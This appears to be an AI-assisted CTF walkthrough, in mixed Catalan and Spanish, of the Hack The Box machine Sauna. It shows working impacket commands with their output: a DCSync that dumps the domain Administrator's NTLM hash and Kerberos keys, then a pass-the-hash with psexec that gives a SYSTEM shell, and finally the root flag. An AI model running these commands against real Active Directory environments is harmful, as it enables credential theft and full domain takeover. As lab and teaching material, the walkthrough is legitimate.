Dado el patrón clàssic de Sauna, la Verificació amb mes valor és comprovar si `svc_loanmgr` pot fer **DCSync**. Això no depèn de que el visor local esté fino.

**Quina troballa domina ara:** el bloqueo està en BloodHound local, no en la explotació ni en la compte `svc_loanmgr`.

**Quina branca principal continua activa:** validación de permisos de domini de `svc_loanmgr`.

**Quines branques secundàries queden anotades:** arreglar CE més adelante o usar Legacy per documentar visualmente el graf.

**Quin és el següent pas únic:** probar si `svc_loanmgr` té capacidad efectiva de DCSync.

## commands

En la màquina atacant:

```bash
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -just-dc-user Administrator
```

Per què aquest ordre i no otro:

La senyal prèvia ja és bastante forta. `svc_loanmgr` no destacó per privilegis locals, así que su valor probable està en el domini. Aquesta prueba comprueba justo això de forma directa i curta.

Què fa:

* usa la credencial ja validada de `svc_loanmgr`
* intenta llegir només el hash del `Administrator` del DC
* evita una extracción masiva innecesaria

Què esperamos obtenir:

* si té drets de replicación, devolverá el hash de `Administrator`
* si no els té, devolverá un error de permisos i entonces sí tocará volver a BloodHound o a otra enumeració AD

Quina part de la sortida interessa realment:

* cualquier línea amb `Administrator` i hash NTLM
* o un error clar de accés denegado / privilegis insuficientes

Com canvia la decisió següent:

* si retornal hash, la següent fase será validar accés amb aquesta identitat
* si no, el següent pas será retomar el anàlisi de ACLs amb Legacy o amb otra via de enumeració AD

## checks

Si el ordre retornal hash de `Administrator`, no fa falta seguir discutiendo amb BloodHound per saber si la compte tenia valor: ja estará demostrado.

Si falla per permisos, entonces el fallo sí será informativo i no un problema del entorn local. Ahí tocará volver al anàlisi de graf amb una eina més compatible amb tus datos.

## writeup_notes

La recol·lecció de AD se completó, però el anàlisi visual amb BloodHound CE va quedar bloqueado per un problema local de migraciones. En aquest punt, la decisió metodológicamente correcta no va ser seguir perdiendo temps en la eina, sinó volver a la evidència principal del cas i validar de forma directa si la compte `svc_loanmgr` tenia drets de replicación sobre el domini.

Lliçó reutilitzable: quan una eina de anàlisi falla per el entorn local, no convé confundir aquest bloqueo amb un fallo de la cadena de explotació. Si la evidència ja apunta a un permís concret, a veces és millor verificarlo directament que seguir arreglando el visor.

[1]: https://www.postgresql.org/docs/current/sql-altertable.html?utm_source=chatgpt.com "Documentation: 18: ALTER TABLE"
[2]: https://BloodHound.specterops.io/collect-data/ce-collection/sharphound?utm_source=chatgpt.com "SharpHound Community Edition"

## Executem el bloc i revisem la sortida

❯ impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -just-dc-user Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up...

## objective

Tancar la fase de enumeració de permisos de domini, interpretar correctament el resultat de `secretsdump` i fijar el següent pas únic per transformar aquest permís en control total del controlador de domini.

## Fets verificats

La prueba ha salido bien i de forma concluyente.

La compte `svc_loanmgr` ha podido ejecutar una operación de replicación contral controlador de domini mediante `DRSUAPI`. Això ja no és una hipótesis ni una sospecha: queda demostrado que aquesta compte té permisos suficientes per realizar un **DCSync**.

El resultat útil més important és el hash NTLM del administrador del domini:

* usuari: `Administrator`
* RID: `500`
* NT hash: `823452073d75b9d1cf70ebdf86c7f98e`

També se han obtenido claves Kerberos del mateix usuari, però per el següent pas la pieza dominant és el **NT hash**.

Amb esto, la cadena tècnica ja queda demostrada fins a aquí:

* accés inicial amb `fsmith`
* hallazgo de credencial en AutoLogon
* Canvi de context a `svc_loanmgr`
* validación de permisos de replicación
* extracción del material de autenticación del `Administrator`

## assumptions

La inferència principal és que el següent pas natural ja no és seguir enumerando Active Directory, perquè la compte `svc_loanmgr` ja ha demostrado de forma práctica que té privilegis de domini suficientes per extraer secretos del DC.

La hipótesis més forta ara és que el hash NTLM del `Administrator` tendrá valor operatiu inmediato mediante **Pass-the-Hash** contral mateix host.

També és raonable asumir que, si aquesta autenticación funciona, el context resultante será de molt alt privilegi, normalmente `NT AUTHORITY\SYSTEM` o equivalente administratiu total en el controlador de domini.

## method

Primer se cierra formalmente la fase AD de permisos delegats, perquè ja ha cumplido su función: demostrar i explotar DCSync amb éxito.

Després se evita obrir branques nuevas o seguir buscando més credencials. Ja no fa falta. El cas ha llegado al punt en que existeix material suficient per intentar control total del host mediante una autenticación amb hash.

El següent pas únic correcte es validar el hash del `Administrator` amb una tècnica de Pass-the-Hash orientada a obtenir shell remota.

## answer

Aquest resultat és el gran tancament tècnic de la màquina.

El que important no és només que haya aparecido el hash del `Administrator`, sinó el que que això demuestra: `svc_loanmgr` no era simplemente una compte útil, sinó una compte amb permisos de replicación sobre el domini. Això resuelve de facto la incógnita principal del cas.

A partir de aquí ja no té sentido seguir amb BloodHound, LDAP, SMB o més enumeració local. La fase de descubrimiento ha terminado. El cas entra en su fase final: **usar el hash del `Administrator` per obtenir control total del controlador de domini**.

La via més neta ara és **Pass-the-Hash** amb `psexec.py`, perquè:

* ja existeix un NT hash válido
* el objective és el propi DC
* `psexec.py` suele dar una shell de alt privilegi molt adecuada per tancar la màquina

**Quina troballa domina ara:** `svc_loanmgr` té capacidad efectiva de DCSync i ha permitido extraer el NT hash del `Administrator`.

**Quina branca principal continua activa:** reutilització del hash del `Administrator` per obtenir control total del DC.

**Quines branques secundàries queden anotades:** ninguna rellevant a curt plazo; la cadena principal ja està prácticamente tancada.

**Quin és el següent pas únic:** usar el NT hash del `Administrator` en una autenticación Pass-the-Hash per obtenir shell remota.

## commands

```bash
psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

Per què se propone aquest ordre:

La senyal prèvia ja és definitiva: se dispone de un NT hash real del `Administrator`. No fa falta recuperar contrasenya en clar ni seguir buscando otras rutas.

Què fa:

* intenta autenticarse com `Administrator` usant Pass-the-Hash
* reutilizal hash NTLM sense necesidad de contrasenya en texto clar
* busca obrir una shell remota amb privilegis máximos en el host

Què se espera obtenir:

* una shell remota válida de molt alt privilegi
* normalmente un context `NT AUTHORITY\SYSTEM` o equivalente amb control total del DC

Quina part de la sortida interessa realment:

* que la autenticación funcione
* que aparezca una shell remota
* que el context efectivo sea administratiu total

Com canvia la decisió següent:

* si entra, la següent fase ja no será de enumeració, sinó de Verificació final de context i lectura del `root.txt`
* si fallara, el hash seguiría siendo valioso, però tocaría probar otra superfície remota compatible amb Pass-the-Hash

## checks

Si la shell entra, comprovar enseguida:

```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

Interessa confirmar tres cosas:

* identitat efectiva del context
* que el host sigue siendo `SAUNA`
* que el flag final és accesible des de aquest context

No mezclar ara més eines ni més branques. Aquest punt ja és de tancament.

## writeup_notes

La fase decisiva de Sauna no estuvo en una escalada local clàssica, sinó en identificar que `svc_loanmgr` tenia permisos de replicación sobre el domini. La prueba amb `secretsdump` el que va confirmar de forma práctica al extraer el material del `Administrator`, el que que va permetre passar directament a una autenticación Pass-the-Hash per tomar control total del controlador de domini.

Lliçó reutilitzable: quan una compte de domini permet DCSync, la investigación deixa de girar alrededor del host local i passa a la capa més alta del entorn. En aquest momento, el objective ja no és encontrar otra escalada, sinó convertir correctament aquest permís de replicación en control efectivo del domini.

## Executem el bloc i revisem la sortida

❯ psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.95.180.....
[*] Found writable share ADMIN$
[*] Uploading file KUmmTKGx.exe
[*] Opening SVCManager on 10.129.95.180.....
[*] Creating service ZgwS on 10.129.95.180.....
[*] Starting service ZgwS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

objective

Tancar la màquina confirmando el context de máximo privilegi, verificar el accés total al controlador de domini i llegir el flag final.

verified_facts

La autenticación amb Pass-the-Hash ha funcionado correctament.

`psexec.py` ha conseguido:

* accés al recurso `ADMIN$`
* subida del binario de servei
* creació i arranque de un servei remot
* apertura de una shell en el objective

La shell ja està abierta en:

`C:\Windows\system32>`

Això confirma que el hash NTLM del `Administrator` era válido i reutilitzable per obtenir control total del host.

En aquest punt, la cadena completa del cas queda demostrada de extremo a extremo:

* obtenció de noms des de la web
* derivació de usuaris
* ASREPRoasting sobre `fsmith`
* recuperació offline de `Thestrokes23`
* accés WinRM amb `fsmith`
* hallazgo de credencial de AutoLogon
* cambio a `svc_loanmgr`
* DCSync exitoso
* Pass-the-Hash amb `Administrator`
* shell remota de máximo privilegi

assumptions

La inferència principal és que el context actual és administratiu total sobre el controlador de domini.

Aun así, abans de dar la màquina per tancada, convé verificar explícitamente la identitat efectiva del proceso i confirmar accés al `root.txt`.

method

No fa falta seguir enumerando més.

El següent pas correcte és fer una Verificació mínima i de tancament:

* identitat efectiva
* nom del host
* accés al flag final

answer

Perfecto. La màquina està prácticamente tancada.

El que important ara no és fer més cosas, sinó confirmar amb limpieza que el context actual és el esperado i tancar el cas amb evidència final.

La branca principal ja no és de explotació ni de escalada: ara és només **Verificació final de control total**.

Quina troballa domina ara: el hash del `Administrator` ha dado shell remota en el DC.

Quina branca principal continua activa: tancament i Verificació final del compromís total.

Quines branques secundàries queden anotades: ninguna rellevant; la cadena principal ja està resuelta.

Quin és el següent pas únic: verificar identitat efectiva i llegir `root.txt`.

commands

```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

Per què és proposen aquestes ordres:

`whoami` se usa per confirmar el context efectivo real de la shell. Tot i que ja todo apunta a privilegi máximo, interessa dejarlo demostrado de forma explícita.

`hostname` sirve per fijar sense ambigüedad que el accés corresponde al host objective `SAUNA`.

`type C:\Users\Administrator\Desktop\root.txt` cierra formalmente la màquina, perquè demuestra accés al flag final des del context comprometido.

Què se espera obtenir:

* una identitat de molt alt privilegi, normalmente `nt authority\system`
* el hostname `SAUNA`
* el contenido del `root.txt`

Quina part de la sortida interessa realment:

* el usuari efectivo
* el nom del host
* el flag final

Com canvia la decisió següent:

* si todo sale com se espera, la màquina queda tancada
* a partir de ahí, ja només quedará consolidar el writeup didàctic

checks

Comprovar que `whoami` retorna context de privilegi máximo.

Confirmar que `hostname` sigue siendo `SAUNA`.

Verificar que `root.txt` és legible des de aquesta shell.

writeup_notes

El tancament de Sauna no dependió de una escalada local clàssica en el DC, sinó de una cadena de Active Directory bien interpretada: identitat pública, abús Kerberos, reutilització de credencials, descubrimiento de AutoLogon, salto a una compte amb permisos delegats i explotació de DCSync per obtenir el hash del administrador. El accés final per Pass-the-Hash va confirmar el control total del domini.

Lliçó reutilitzable: en entornos AD, una compte aparentment modesta pot esconder el verdadero punt de quiebre del cas. Quan una compte permet replicación de secretos del domini, el objective deixa de ser “escalar un poc més” i passa a ser convertir correctament aquest permís en control total verificable.

## Executem el bloc i revisem la sortida

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
SAUNA

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
2ebc5339eff500834123056f79cad936

objective

Tancar formalmente la màquina Sauna amb evidència final de compromís total i dejar consolidada la cadena tècnica completa per el futuro MD didàctic.

verified_facts

La shell obtenida mediante Pass-the-Hash té privilegi máximo en el objective.

La identitat efectiva del context actual és:

* `nt authority\system`

El host comprometido és:

* `SAUNA`

El flag final ha sido leído correctament des de:

* `C:\Users\Administrator\Desktop\root.txt`

Valor obtenido:

* `2ebc5339eff500834123056f79cad936`

Amb esto queda verificat el compromís total del controlador de domini.

assumptions

Ja no queda ninguna hipótesis operativa rellevant per resolver la màquina. La cadena principal està tancada de extremo a extremo.

La única tarea pendent a partir de aquí és editorial: consolidar el cas en un writeup didàctic net, ordenado i trazable.

method

Se toma la shell final i se verifica de forma mínima però suficient:

* identitat efectiva
* nom del host
* accés al flag final

No se añaden més checks perquè ja no aportan valor a la resolució del cas.

answer

la màquina queda tancada.

La evidència final confirma exactamente el resultat que se esperaba en la fase de tancament:

* control total del sistema
* context `SYSTEM`
* lectura correcta del `root.txt`

La cadena tècnica completa queda así:

1. enumeració inicial de un entorn Windows amb senyals clares de Active Directory;
2. uso de la web pública com font de noms reals;
3. derivació de usuaris candidats;
4. validación de la convenció `inicial + apellido`;
5. obtenció de AS-REP hash per `fsmith`;
6. Recuperació offline de la contrasenya `Thestrokes23`;
7. accés remot per WinRM com `fsmith`;
8. hallazgo en el registre de credencials AutoLogon;
9. validación de la compte real `svc_loanmgr`;
10. accés remot per WinRM com `svc_loanmgr`;
11. comprobación de que el valor real de la compte estaba en Active Directory i no en privilegis locals;
12. ejecución de DCSync amb `svc_loanmgr` per extraer el hash del `Administrator`;
13. Pass-the-Hash amb `Administrator`;
14. shell final com `nt authority\system`;
15. lectura del `root.txt`.

Quina troballa domina ara: compromís total verificat del controlador de domini.

Quina branca principal continua activa: ninguna operativa; la explotació ha terminado i el cas està resuelto.

Quines branques secundàries queden anotades: ninguna necesaria per la resolució.

Quin és el següent pas únic: consolidar todo en el MD final didàctic.

commands

```cmd id="8u2vqm"
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

Aquests tres commands cierran la màquina perquè confirman el que únic que ja importa al final del cas:

* el nivel real de privilegi
* el host comprometido
* el accés al flag final

checks

Comprovar que el context és `nt authority\system`.

Comprovar que el host sigue siendo `SAUNA`.

Comprovar que el `root.txt` és legible i queda registrado correctament en les notes.

Dar per tancada la part tècnica de explotació i no seguir añadiendo soroll innecesario.

writeup_notes

Sauna és una màquina de Active Directory cuya resolució no depèn de una única debilidad aislada, sinó de una cadena bien interpretada. La web pública aporta noms reals, esos noms permeten derivar usuaris plausibles, Kerberos ofrece un punt de entrada mediante ASREPRoasting, el accés inicial conduce a una credencial exposada en AutoLogon i aquesta segunda compte revela su verdadero valor en permisos delegats de domini. El punt decisivo del cas llega quan `svc_loanmgr` demuestra capacidad de DCSync, el que que permet extraer el hash del `Administrator` i convertirlo en control total mediante Pass-the-Hash.

Lliçó reutilitzable:

En Active Directory, una compte aparentment modesta pot ser molt més perillosa per sus permisos delegats en el domini que per sus privilegis locals en el host. Per això, quan una compte no destaca localment, no convé descartarla: a menudo el verdadero salto està en el que que pot fer contral domini i no en el que que pot fer en la màquina on se ha iniciado sesión.
